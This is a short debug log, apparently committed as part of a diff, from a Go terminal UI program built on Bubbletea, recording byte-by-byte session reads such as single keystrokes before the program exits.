+2026/03/23 23:09:27 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:09:27 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:09:27 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:10:31 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:31 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:10:32 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:32 ui.go:139: [UI] Session data (1 bytes): e
+2026/03/23 23:10:33 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:33 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:10:34 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:34 ui.go:139: [UI] Session data (1 bytes): 
+2026/03/23 23:10:35 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:35 ui.go:139: [UI] Session data (1 bytes): :
+2026/03/23 23:10:37 ui.go:704: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:10:37 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:10:37 ui.go:704: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:10:37 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:10:37 ui.go:704: [DEBUG] Session 1 read 3 bytes
+2026/03/23 23:10:37 ui.go:139: [UI] Session data (3 bytes):  
+2026/03/23 23:10:38 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:38 ui.go:139: [UI] Session data (1 bytes): !
+2026/03/23 23:10:40 ui.go:704: [DEBUG] Session 1 read 1 bytes
+2026/03/23 23:10:40 ui.go:139: [UI] Session data (1 bytes): s
+2026/03/23 23:10:40 ui.go:704: [DEBUG] Session 1 read 6 bytes
+2026/03/23 23:10:40 ui.go:139: [UI] Session data (6 bytes):   
+2026/03/23 23:10:42 main.go:168: Bubbletea program ended
